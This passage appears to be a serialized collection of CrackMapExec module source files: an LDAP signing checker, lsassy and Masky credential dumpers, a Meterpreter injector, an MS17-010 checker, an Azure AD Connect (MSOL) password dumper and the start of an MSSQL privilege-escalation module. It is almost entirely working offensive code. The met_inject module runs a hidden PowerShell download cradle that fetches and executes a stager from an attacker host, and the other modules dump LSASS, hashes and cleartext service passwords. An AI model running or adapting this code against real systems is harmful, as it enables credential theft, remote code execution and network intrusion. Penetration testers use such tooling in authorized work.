ssl_sock.close()\n                    return False\n                else:\n                    context.log.fail(""Unexpected error during LDAPS handshake: "" + str(e))\n                    ssl_sock.close()\n                    return False\n\n        # Conduct and LDAP bind and determine if server signing\n        # requirements are enforced based on potential errors\n        # during the bind attempt.\n        async def run_ldap(target, credential):\n            ldapsClientConn = MSLDAPClientConnection(target, credential)\n            _, err = await ldapsClientConn.connect()\n            if err is None:\n                _, err = await ldapsClientConn.bind()\n                if ""stronger"" in str(err):\n                    return True  # because LDAP server signing requirements ARE enforced\n                elif (""data 52e"" or ""data 532"") in str(err):\n                    context.log.fail(""Not connected... exiting"")\n                    exit()\n                elif err is None:\n                    return False\n            else:\n                context.log.fail(str(err))\n\n        # Run trough all our code blocks to determine LDAP signing and channel binding settings.   \n        stype = asyauthSecret.PASS if not connection.nthash else asyauthSecret.NT\n        secret = connection.password if not connection.nthash else connection.nthash\n        if not connection.kerberos:\n            credential = NTLMCredential(\n                secret=secret,\n                username=connection.username,\n                domain=connection.domain,\n                stype=stype,\n            )\n        else:\n            kerberos_target = UniTarget(\n                connection.hostname + \'.\' + connection.domain,\n                88,\n                UniProto.CLIENT_TCP,\n                proxies=None,\n                dns=None,\n                dc_ip=connection.domain,\n                domain=connection.domain\n            )\n            credential = KerberosCredential(\n                target=kerberos_target,\n                secret=secret,\n                username=connection.username,\n                domain=connection.domain,\n                stype=stype,\n            )\n\n        target = MSLDAPTarget(connection.host, hostname=connection.hostname, domain=connection.domain, dc_ip=connection.domain)\n        ldapIsProtected = asyncio.run(run_ldap(target, credential))\n\n        if ldapIsProtected == False:\n            context.log.highlight(""LDAP Signing NOT Enforced!"")\n        elif ldapIsProtected == True:\n            context.log.fail(""LDAP Signing IS Enforced"")\n        else:\n            context.log.fail(""Connection fail, exiting now"")\n            exit()\n\n        if DoesLdapsCompleteHandshake(connection.host) == True:\n            target = MSLDAPTarget(connection.host, 636, UniProto.CLIENT_SSL_TCP, hostname=connection.hostname, domain=connection.domain, dc_ip=connection.domain)\n            ldapsChannelBindingAlwaysCheck = asyncio.run(run_ldaps_noEPA(target, credential))\n            target = MSLDAPTarget(connection.host, hostname=connection.hostname, domain=connection.domain, dc_ip=connection.domain)\n            ldapsChannelBindingWhenSupportedCheck = asyncio.run(run_ldaps_withEPA(target, credential))\n            if ldapsChannelBindingAlwaysCheck == False and ldapsChannelBindingWhenSupportedCheck == True:\n                context.log.highlight(\'LDAPS Channel Binding is set to ""When Supported""\')\n            elif ldapsChannelBindingAlwaysCheck == False and ldapsChannelBindingWhenSupportedCheck == False:\n                context.log.highlight(\'LDAPS Channel Binding is set to ""NEVER""\')\n            elif ldapsChannelBindingAlwaysCheck == True:\n                context.log.fail(\'LDAPS Channel Binding is set to ""Required""\')\n            else:\n                context.log.fail(""\\nSomething went wrong..."")\n                exit()\n        else:\n            context.log.fail(connection.domain + "" - cannot complete TLS handshake, cert likely not configured"")\n', 'lsassy_dump.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author:\n#  Romain Bentz (pixis - @hackanddo)\n# Website:\n#  https://beta.hackndo.com [FR]\n#  https://en.hackndo.com [EN]\n\nfrom lsassy.dumper import Dumper\nfrom lsassy.impacketfile import ImpacketFile\nfrom lsassy.parser import Parser\nfrom lsassy.session import Session\n\nfrom cme.helpers.bloodhound import add_user_bh\n\n\nclass CMEModule:\n    name = ""lsassy""\n    description = ""Dump lsass and parse the result remotely with lsassy""\n    supported_protocols = [""smb""]\n    opsec_safe = True  # writes temporary files, and it\'s possible for them to not be deleted\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.method = None\n\n    def options(self, context, module_options):\n        """"""\n        METHOD              Method to use to dump lsass.exe with lsassy\n        """"""\n        self.method = ""comsvcs""\n        if ""METHOD"" in module_options:\n            self.method = module_options[""METHOD""]\n\n    def on_admin_login(self, context, connection):\n        host = connection.host\n        domain_name = connection.domain\n        username = connection.username\n        password = getattr(connection, ""password"", """")\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n\n        session = Session()\n        session.get_session(\n            address=host,\n            target_ip=host,\n            port=445,\n            lmhash=lmhash,\n            nthash=nthash,\n            username=username,\n            password=password,\n            domain=domain_name,\n        )\n\n        if session.smb_session is None:\n            context.log.fail(""Couldn\'t connect to remote host"")\n            return False\n\n        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)\n        if dumper is None:\n            context.log.fail(""Unable to load dump method \'{}\'"".format(self.method))\n            return False\n\n        file = dumper.dump()\n        if file is None:\n            context.log.fail(""Unable to dump lsass"")\n            return False\n\n        parsed = Parser(file).parse()\n        if parsed is None:\n            context.log.fail(""Unable to parse lsass dump"")\n            return False\n        credentials, tickets, masterkeys = parsed\n\n        file.close()\n        context.log.debug(f""Closed dumper file"")\n        file_path = file.get_file_path()\n        context.log.debug(f""File path: {file_path}"")\n        try:\n            deleted_file = ImpacketFile.delete(session, file_path)\n            if deleted_file:\n                context.log.debug(f""Deleted dumper file"")\n            else:\n                context.log.fail(f""[OPSEC] No exception, but failed to delete file: {file_path}"")\n        except Exception as e:\n            context.log.fail(f""[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}"")\n\n        if credentials is None:\n            credentials = []\n\n        for cred in credentials:\n            c = cred.get_object()\n            context.log.debug(f""Cred: {c}"")\n\n        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith(""$"")]\n        credentials_unique = []\n        credentials_output = []\n        context.log.debug(f""Credentials: {credentials}"")\n\n        for cred in credentials:\n            context.log.debug(f""Credential: {cred}"")\n            if [\n                cred[""domain""],\n                cred[""username""],\n                cred[""password""],\n                cred[""lmhash""],\n                cred[""nthash""],\n            ] not in credentials_unique:\n                credentials_unique.append(\n                    [\n                        cred[""domain""],\n                        cred[""username""],\n                        cred[""password""],\n                        cred[""lmhash""],\n                        cred[""nthash""],\n                    ]\n                )\n                credentials_output.append(cred)\n\n        context.log.debug(f""Calling process_credentials"")\n        self.process_credentials(context, connection, credentials_output)\n\n    def process_credentials(self, context, connection, credentials):\n        if len(credentials) == 0:\n            context.log.display(""No credentials found"")\n        credz_bh = []\n        domain = None\n        for cred in credentials:\n            if cred[""domain""] == None:\n                cred[""domain""] = """"\n            domain = cred[""domain""]\n            if ""."" not in cred[""domain""] and cred[""domain""].upper() in connection.domain.upper():\n                domain = connection.domain  # slim shady\n            self.save_credentials(\n                context,\n                connection,\n                cred[""domain""],\n                cred[""username""],\n                cred[""password""],\n                cred[""lmhash""],\n                cred[""nthash""],\n            )\n            self.print_credentials(\n                context,\n                cred[""domain""],\n                cred[""username""],\n                cred[""password""],\n                cred[""lmhash""],\n                cred[""nthash""],\n            )\n            credz_bh.append({""username"": cred[""username""].upper(), ""domain"": domain.upper()})\n            add_user_bh(credz_bh, domain, context.log, connection.config)\n\n    @staticmethod\n    def print_credentials(context, domain, username, password, lmhash, nthash):\n        if password is None:\n            password = "":"".join(h for h in [lmhash, nthash] if h is not None)\n        output = ""%s\\\\%s %s"" % (domain, username, password)\n        context.log.highlight(output)\n\n    @staticmethod\n    def save_credentials(context, connection, domain, username, password, lmhash, nthash):\n        host_id = context.db.get_hosts(connection.host)[0][0]\n        if password is not None:\n            credential_type = ""plaintext""\n        else:\n            credential_type = ""hash""\n            password = "":"".join(h for h in [lmhash, nthash] if h is not None)\n        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)\n', 'masky.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom masky import Masky\nfrom cme.helpers.bloodhound import add_user_bh\n\n\nclass CMEModule:\n    name = ""masky""\n    description = ""Remotely dump domain user credentials via an ADCS and a KDC""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        CA              Certificate Authority Name (CA_SERVER\\CA_NAME)\n        TEMPLATE        Template name allowing users to authenticate with (default: User)\n        DC_IP           IP Address of the domain controller\n        AGENT_EXE       Path to a custom executable masky agent to be deployed\n        """"""\n        self.template = ""User""\n        self.ca = None\n        self.dc_ip = None\n        self.agent_exe = None\n        self.file_args = False\n\n        if ""CA"" in module_options:\n            self.ca = module_options[""CA""]\n\n        if ""TEMPLATE"" in module_options:\n            self.template = module_options[""TEMPLATE""]\n\n        if ""DC_IP"" in module_options:\n            self.dc_ip = module_options[""DC_IP""]\n\n        if ""AGENT_EXE"" in module_options:\n            self.agent_exe = module_options[""AGENT_EXE""]\n            self.file_args = True\n\n    def on_admin_login(self, context, connection):\n        if not self.ca:\n            context.log.fail(""Please provide a valid CA server and CA name (CA_SERVER\\CA_NAME)"")\n            return False\n\n        host = connection.host\n        domain = connection.domain\n        username = connection.username\n        kerberos = connection.kerberos\n        password = getattr(connection, ""password"", """")\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n\n        m = Masky(\n            ca=self.ca,\n            template=self.template,\n            user=username,\n            dc_ip=self.dc_ip,\n            domain=domain,\n            password=password,\n            hashes=f""{lmhash}:{nthash}"",\n            kerberos=kerberos,\n            exe_path=self.agent_exe,\n            file_args=self.file_args,\n        )\n\n        context.log.display(""Running Masky on the targeted host"")\n        rslts = m.run(host)\n        tracker = m.get_last_tracker()\n\n        self.process_results(connection, context, rslts, tracker)\n\n        return self.process_errors(context, tracker)\n\n    def process_results(self, connection, context, rslts, tracker):\n        if not tracker.nb_hijacked_users:\n            context.log.display(""No users\' sessions were hijacked"")\n        else:\n            context.log.display(f""{tracker.nb_hijacked_users} session(s) successfully hijacked"")\n            context.log.display(""Attempting to retrieve NT hash(es) via PKINIT"")\n\n        if not rslts:\n            return False\n\n        pwned_users = 0\n        for user in rslts.users:\n            if user.nthash:\n                context.log.highlight(f""{user.domain}\\{user.name} {user.nthash}"")\n                self.process_credentials(connection, context, user)\n                pwned_users += 1\n\n        if pwned_users:\n            context.log.success(f""{pwned_users} NT hash(es) successfully collected"")\n        else:\n            context.log.fail(""Unable to collect NT hash(es) from the hijacked session(s)"")\n        return True\n\n    def process_credentials(self, connection, context, user):\n        host = context.db.get_hosts(connection.host)[0][0]\n        context.db.add_credential(\n            ""hash"",\n            user.domain,\n            user.name,\n            user.nthash,\n            pillaged_from=host,\n        )\n        add_user_bh(user.name, user.domain, context.log, connection.config)\n\n    def process_errors(self, context, tracker):\n        ret = True\n\n        if tracker.last_error_msg:\n            context.log.fail(tracker.last_error_msg)\n            ret = False\n\n        if not tracker.files_cleaning_success:\n            context.log.fail(""Fail to clean files related to Masky"")\n            context.log.fail((f""Please remove the files named \'{tracker.agent_filename}\', \'{tracker.error_filename}\', "" f""\'{tracker.output_filename}\' & \'{tracker.args_filename}\' within the folder \'\\\\Windows\\\\Temp\\\\\'""))\n            ret = False\n\n        if not tracker.svc_cleaning_success:\n            context.log.fail(f""Fail to remove the service named \'{tracker.svc_name}\', please remove it manually"")\n            ret = False\n        return ret\n', 'met_inject.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom sys import exit\n\n\nclass CMEModule:\n    """"""\n    Downloads the Meterpreter stager and injects it into memory using PowerSploit\'s Invoke-Shellcode.ps1 script\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""met_inject""\n    description = ""Downloads the Meterpreter stager and injects it into memory""\n    supported_protocols = [""smb"", ""mssql""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.rand = None\n        self.srvport = None\n        self.srvhost = None\n        self.met_ssl = None\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""\n        SRVHOST     IP hosting of the stager server\n        SRVPORT     Stager port\n        RAND        Random string given by metasploit (if using web_delivery)\n        SSL         Stager server use https or http (default: https)\n\n        multi/handler method that don\'t require RAND:\n            Set LHOST and LPORT (called SRVHOST and SRVPORT in CME module options)\n            Set payload to one of the following (non-exhaustive list):\n                windows/x64/powershell_reverse_tcp\n                windows/x64/powershell_reverse_tcp_ssl\n        Web Delivery Method (exploit/multi/script/web_delivery):\n            Set SRVHOST and SRVPORT\n            Set payload to what you want (windows/meterpreter/reverse_https, etc)\n            after running, copy the end of the URL printed (e.g. M5LemwmDHV) and set RAND to that\n        """"""\n\n        self.met_ssl = ""https""\n\n        if ""SRVHOST"" not in module_options or ""SRVPORT"" not in module_options:\n            context.log.fail(""SRVHOST and SRVPORT options are required!"")\n            exit(1)\n\n        if ""SSL"" in module_options:\n            self.met_ssl = module_options[""SSL""]\n        if ""RAND"" in module_options:\n            self.rand = module_options[""RAND""]\n\n        self.srvhost = module_options[""SRVHOST""]\n        self.srvport = module_options[""SRVPORT""]\n\n    def on_admin_login(self, context, connection):\n        # stolen from https://github.com/jaredhaight/Invoke-MetasploitPayload\n        command = """"""$url=""{}://{}:{}/{}""\n        $DownloadCradle =\'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring(\'\'\'+$url+\'\'\'"");\'\n        $PowershellExe=$env:windir+\'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\powershell.exe\'\n        if([Environment]::Is64BitProcess) {{ $PowershellExe=\'powershell.exe\'}}\n        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo\n        $ProcessInfo.FileName=$PowershellExe\n        $ProcessInfo.Arguments=""-nop -c $DownloadCradle""\n        $ProcessInfo.UseShellExecute = $False\n        $ProcessInfo.RedirectStandardOutput = $True\n        $ProcessInfo.CreateNoWindow = $True\n        $ProcessInfo.WindowStyle = ""Hidden""\n        $Process = [System.Diagnostics.Process]::Start($ProcessInfo)"""""".format(\n            ""http"" if self.met_ssl == ""http"" else ""https"",\n            self.srvhost,\n            self.srvport,\n            self.rand,\n        )\n        context.log.debug(command)\n        connection.ps_execute(command, force_ps32=True)\n        context.log.success(""Executed payload"")\n', 'ms17-010.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# All credits to https://github.com/d4t4s3c/Win7Blue\n# @d4t4s3c\n# Module by @mpgn_x64\n\nfrom ctypes import *\nimport socket\nimport struct\n\n\nclass CMEModule:\n    name = ""ms17-010""\n    description = ""MS17-010, /!\\ not tested oustide home lab""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_login(self, context, connection):\n        if check(connection.host):\n            context.log.highlight(""VULNERABLE"")\n            context.log.highlight(""Next step: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/"")\n\n\nclass SMB_HEADER(Structure):\n    """"""SMB Header decoder.""""""\n\n    _pack_ = 1\n\n    _fields_ = [\n        (""server_component"", c_uint32),\n        (""smb_command"", c_uint8),\n        (""error_class"", c_uint8),\n        (""reserved1"", c_uint8),\n        (""error_code"", c_uint16),\n        (""flags"", c_uint8),\n        (""flags2"", c_uint16),\n        (""process_id_high"", c_uint16),\n        (""signature"", c_uint64),\n        (""reserved2"", c_uint16),\n        (""tree_id"", c_uint16),\n        (""process_id"", c_uint16),\n        (""user_id"", c_uint16),\n        (""multiplex_id"", c_uint16),\n    ]\n\n    def __new__(self, buffer=None):\n        return self.from_buffer_copy(buffer)\n\n\ndef generate_smb_proto_payload(*protos):\n    """"""Generate SMB Protocol. Pakcet protos in order.""""""\n    hexdata = []\n    for proto in protos:\n        hexdata.extend(proto)\n    return """".join(hexdata)\n\n\ndef calculate_doublepulsar_xor_key(s):\n    """"""Calaculate Doublepulsar Xor Key""""""\n    x = 2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8))\n    x = x & 0xFFFFFFFF\n    return x\n\n\ndef negotiate_proto_request():\n    """"""Generate a negotiate_proto_request packet.""""""\n    netbios = [""\\x00"", ""\\x00\\x00\\x54""]\n\n    smb_header = [\n        ""\\xFF\\x53\\x4D\\x42"",\n        ""\\x72"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x18"",\n        ""\\x01\\x28"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x2F\\x4B"",\n        ""\\x00\\x00"",\n        ""\\xC5\\x5E"",\n    ]\n\n    negotiate_proto_request = [\n        ""\\x00"",\n        ""\\x31\\x00"",\n        ""\\x02"",\n        ""\\x4C\\x41\\x4E\\x4D\\x41\\x4E\\x31\\x2E\\x30\\x00"",\n        ""\\x02"",\n        ""\\x4C\\x4D\\x31\\x2E\\x32\\x58\\x30\\x30\\x32\\x00"",\n        ""\\x02"",\n        ""\\x4E\\x54\\x20\\x4C\\x41\\x4E\\x4D\\x41\\x4E\\x20\\x31\\x2E\\x30\\x00"",\n        ""\\x02"",\n        ""\\x4E\\x54\\x20\\x4C\\x4D\\x20\\x30\\x2E\\x31\\x32\\x00"",\n    ]\n\n    return generate_smb_proto_payload(netbios, smb_header, negotiate_proto_request)\n\n\ndef session_setup_andx_request():\n    """"""Generate session setuo andx request.""""""\n    netbios = [""\\x00"", ""\\x00\\x00\\x63""]\n\n    smb_header = [\n        ""\\xFF\\x53\\x4D\\x42"",\n        ""\\x73"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x18"",\n        ""\\x01\\x20"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x2F\\x4B"",\n        ""\\x00\\x00"",\n        ""\\xC5\\x5E"",\n    ]\n\n    session_setup_andx_request = [\n        ""\\x0D"",\n        ""\\xFF"",\n        ""\\x00"",\n        ""\\x00\\x00"",\n        ""\\xDF\\xFF"",\n        ""\\x02\\x00"",\n        ""\\x01\\x00"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x40\\x00\\x00\\x00"",\n        ""\\x26\\x00"",\n        ""\\x00"",\n        ""\\x2e\\x00"",\n        ""\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x32\\x30\\x30\\x30\\x20\\x32\\x31\\x39\\x35\\x00"",\n        ""\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x32\\x30\\x30\\x30\\x20\\x35\\x2e\\x30\\x00"",\n    ]\n\n    return generate_smb_proto_payload(netbios, smb_header, session_setup_andx_request)\n\n\ndef tree_connect_andx_request(ip, userid):\n    """"""Generate tree connect andx request.""""""\n\n    netbios = [""\\x00"", ""\\x00\\x00\\x47""]\n\n    smb_header = [\n        ""\\xFF\\x53\\x4D\\x42"",\n        ""\\x75"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x18"",\n        ""\\x01\\x20"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x2F\\x4B"",\n        userid,\n        ""\\xC5\\x5E"",\n    ]\n\n    ipc = ""\\\\\\\\{}\\IPC$\\x00"".format(ip)\n\n    tree_connect_andx_request = [\n        ""\\x04"",\n        ""\\xFF"",\n        ""\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x01\\x00"",\n        ""\\x1A\\x00"",\n        ""\\x00"",\n        ipc.encode(),\n        ""\\x3f\\x3f\\x3f\\x3f\\x3f\\x00"",\n    ]\n\n    length = len("""".join(smb_header)) + len("""".join(tree_connect_andx_request))\n\n    netbios[1] = struct.pack("">L"", length)[-3:]\n\n    return generate_smb_proto_payload(netbios, smb_header, tree_connect_andx_request)\n\n\ndef peeknamedpipe_request(treeid, processid, userid, multiplex_id):\n    """"""Generate tran2 request""""""\n\n    netbios = [""\\x00"", ""\\x00\\x00\\x4a""]\n\n    smb_header = [\n        ""\\xFF\\x53\\x4D\\x42"",\n        ""\\x25"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x18"",\n        ""\\x01\\x28"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        treeid,\n        processid,\n        userid,\n        multiplex_id,\n    ]\n\n    tran_request = [\n        ""\\x10"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\xff\\xff"",\n        ""\\xff\\xff"",\n        ""\\x00"",\n        ""\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00"",\n        ""\\x4a\\x00"",\n        ""\\x00\\x00"",\n        ""\\x4a\\x00"",\n        ""\\x02"",\n        ""\\x00"",\n        ""\\x23\\x00"",\n        ""\\x00\\x00"",\n        ""\\x07\\x00"",\n        ""\\x5c\\x50\\x49\\x50\\x45\\x5c\\x00"",\n    ]\n\n    return generate_smb_proto_payload(netbios, smb_header, tran_request)\n\n\ndef trans2_request(treeid, processid, userid, multiplex_id):\n    """"""Generate trans2 request.""""""\n\n    netbios = [""\\x00"", ""\\x00\\x00\\x4f""]\n\n    smb_header = [\n        ""\\xFF\\x53\\x4D\\x42"",\n        ""\\x32"",\n        ""\\x00\\x00\\x00\\x00"",\n        ""\\x18"",\n        ""\\x07\\xc0"",\n        ""\\x00\\x00"",\n        ""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"",\n        ""\\x00\\x00"",\n        treeid,\n        processid,\n        userid,\n        multiplex_id,\n    ]\n\n    trans2_request = [\n        ""\\x0f"",\n        ""\\x0c\\x00"",\n        ""\\x00\\x00"",\n        ""\\x01\\x00"",\n        ""\\x00\\x00"",\n        ""\\x00"",\n        ""\\x00"",\n        ""\\x00\\x00"",\n        ""\\xa6\\xd9\\xa4\\x00"",\n        ""\\x00\\x00"",\n        ""\\x0c\\x00"",\n        ""\\x42\\x00"",\n        ""\\x00\\x00"",\n        ""\\x4e\\x00"",\n        ""\\x01"",\n        ""\\x00"",\n        ""\\x0e\\x00"",\n        ""\\x00\\x00"",\n        ""\\x0c\\x00"" + ""\\x00"" * 12,\n    ]\n\n    return generate_smb_proto_payload(netbios, smb_header, trans2_request)\n\n\ndef check(ip, port=445):\n    """"""Check if MS17_010 SMB Vulnerability exists.""""""\n    try:\n        buffersize = 1024\n        timeout = 5.0\n\n        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        client.settimeout(timeout)\n        client.connect((ip, port))\n\n        raw_proto = negotiate_proto_request()\n        client.send(raw_proto)\n        tcp_response = client.recv(buffersize)\n\n        raw_proto = session_setup_andx_request()\n        client.send(raw_proto)\n        tcp_response = client.recv(buffersize)\n        netbios = tcp_response[:4]\n        smb_header = tcp_response[4:36]\n        smb = SMB_HEADER(smb_header)\n\n        user_id = struct.pack(""<H"", smb.user_id)\n\n        session_setup_andx_response = tcp_response[36:]\n        native_os = session_setup_andx_response[9:].split(""\\x00"")[0]\n\n        raw_proto = tree_connect_andx_request(ip, user_id)\n        client.send(raw_proto)\n        tcp_response = client.recv(buffersize)\n\n        netbios = tcp_response[:4]\n        smb_header = tcp_response[4:36]\n        smb = SMB_HEADER(smb_header)\n\n        tree_id = struct.pack(""<H"", smb.tree_id)\n        process_id = struct.pack(""<H"", smb.process_id)\n        user_id = struct.pack(""<H"", smb.user_id)\n        multiplex_id = struct.pack(""<H"", smb.multiplex_id)\n\n        raw_proto = peeknamedpipe_request(tree_id, process_id, user_id, multiplex_id)\n        client.send(raw_proto)\n        tcp_response = client.recv(buffersize)\n\n        netbios = tcp_response[:4]\n        smb_header = tcp_response[4:36]\n        smb = SMB_HEADER(smb_header)\n\n        nt_status = struct.pack(""BBH"", smb.error_class, smb.reserved1, smb.error_code)\n\n        if nt_status == ""\\x05\\x02\\x00\\xc0"":\n            return True\n        elif nt_status in (""\\x08\\x00\\x00\\xc0"", ""\\x22\\x00\\x00\\xc0""):\n            return False\n        else:\n            return False\n\n    except Exception as err:\n        return False\n    finally:\n        client.close()\n', 'msol.py': '# MSOL module for CME\n# Author of the module : https://twitter.com/Daahtk\n# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/\nfrom sys import exit\nfrom os import path\nfrom cme.helpers.powershell import get_ps_script\n\n\nclass CMEModule:\n    name = ""msol""\n    description = ""Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.use_embedded = None\n        self.MSOL_PS1 = None\n        self.msol_embedded = None\n        self.cmd = None\n        self.msolmdl = None\n        self.msol = None\n        self.tmp_share = None\n        self.share = None\n        self.tmp_dir = None\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""\n        MSOL_PS1   // Path to the msol binary on your computer\n        """"""\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.msol = ""msol.ps1""\n        self.use_embedded = True\n        self.msolmdl = self.cmd = """"\n\n        with open(get_ps_script(""msol_dump/msol_dump.ps1""), ""r"") as msolsc:\n            self.msol_embedded = msolsc.read()\n\n        if ""MSOL_PS1"" in module_options:\n            self.MSOL_PS1 = module_options[""MSOL_PS1""]\n            self.use_embedded = False\n\n    def exec_script(self, _, connection):\n        command = f""C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1""\n        return connection.execute(command, True)\n\n    def on_admin_login(self, context, connection):\n        if self.use_embedded:\n            file_to_upload = ""/tmp/msol.ps1""\n            with open(file_to_upload, ""w"") as msol:\n                msol.write(self.msol_embedded)\n        else:\n            if path.isfile(self.MSOL_PS1):\n                file_to_upload = self.MSOL_PS1\n            else:\n                context.log.fail(f""Cannot open {self.MSOL_PS1}"")\n                exit(1)\n\n        context.log.display(f""Uploading {self.msol}"")\n        with open(file_to_upload, ""rb"") as msol:\n            try:\n                connection.conn.putFile(self.share, f""{self.tmp_share}{self.msol}"", msol.read)\n                context.log.success(f""Msol script successfully uploaded"")\n            except Exception as e:\n                context.log.fail(f""Error writing file to share {self.tmp_share}: {e}"")\n                return\n        try:\n            if self.cmd == """":\n                context.log.display(f""Executing the script"")\n                p = self.exec_script(context, connection)\n                for line in p.splitlines():\n                    p1, p2 = line.split("" "", 1)\n                    context.log.highlight(f""{p1} {p2}"")\n            else:\n                context.log.fail(f""Script Execution Impossible"")\n\n        except Exception as e:\n            context.log.fail(f""Error running command: {e}"")\n        finally:\n            try:\n                connection.conn.deleteFile(self.share, f""{self.tmp_share}{self.msol}"")\n                context.log.success(f""Msol script successfully deleted"")\n            except Exception as e:\n                context.log.fail(f""[OPSEC] Error deleting msol script on {self.share}: {e}"")\n', 'mssql_priv.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author:\n#  Romain de Reydellet (@pentest_soka)\n\n\nfrom cme.helpers.logger import highlight\n\n\nclass User:\n    def __init__(self, username):\n        # current username\n        self.username = username\n        # user(s) we can impersonate\n        self.grantors = []\n        self.parent = None\n        self.is_sysadmin = False\n        self.dbowner = None\n\n    def __str__(self):\n        return f""User({self.username})""\n\n\nclass CMEModule:\n    """"""\n    Enumerate MSSQL privileges and exploit them\n    """"""\n\n    name = ""mssql_priv""\n    description = ""Enumerate and exploit MSSQL privileges""\n    supported_protocols = [""mssql""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self):\n        self.admin_privs = None\n        self.current_user = None\n        self.current_username = None\n        self.mssql_conn = None\n        self.action = None\n        self.context = None\n\n    def options(self, context, module_options):\n        """"""\n        ACTION    Specifies the action to perform:\n            - enum_priv (default)\n            - privesc\n            - rollback (remove sysadmin privilege)\n        """"""\n        self.action = None\n        self.context = context\n\n        if ""ACTION"" in module_options:\n            self.action = module_options[""ACTION""]\n\n    def on_login(self, context, connection):\n        # get mssql connection\n        self.mssql_conn = connection.conn\n        # fetch the current user\n        self.current_username = self.get_current_username()\n        self.current_user = User(self.current_username)\n        self.current_user.is_sysadmin = self.is_admin()\n        self.current_user.dbowner = self.check_dbowner_privesc()\n\n        if self.action == ""rollback"":\n            if not self.current_user.is_sysadmin:\n                self.context.log.fail(f""{self.current_username} is not sysadmin"")\n                return\n            if self.remove_sysadmin_priv():\n                self.context.log.success(""sysadmin role removed"")\n            else:\n                self.context.log.success(""failed to remove sysadmin role"")\n            return\n\n        if self.current_user.is_sysadmin:\n            self.context.log.success(f""{self.current_username} is already a sysadmin"")\n            return\n\n        # build path\n        self.perform_impersonation_check(self.current_user)\n        # look for a privesc path\n        target_user = self.browse_path(context, self.current_user, self.current_user)\n        if self.action == ""privesc"":\n            if not target_user:\n                self.context.log.fail(""can\'t find any path to privesc"")\n            else:\n                exec_as = self.build_exec_as_from_path(target_user)\n                # privesc via impersonation privilege\n                if target_user.is_sysadmin:\n                    self.do_impersonation_privesc(self.current_username, exec_as)\n                # privesc via dbowner privilege\n                elif target_user.dbowner:\n                    self.do_dbowner_privesc(target_user.dbowner, exec_as)\n            if self.is_admin_user(self.current_username):\n                self.context.log.success(f""{self.current_username} is now a sysadmin! "" + highlight(""({})"".format(self.context.conf.get(""CME"", ""pwn3d_label""))))\n\n    def build_exec_as_from_path(self, target_user):\n        path = [target_user.username]\n        parent = target_user.parent\n        while parent:\n            path.append(parent.username)\n            parent = parent.parent\n        # remove the last one\n        path.pop(-1)\n        return 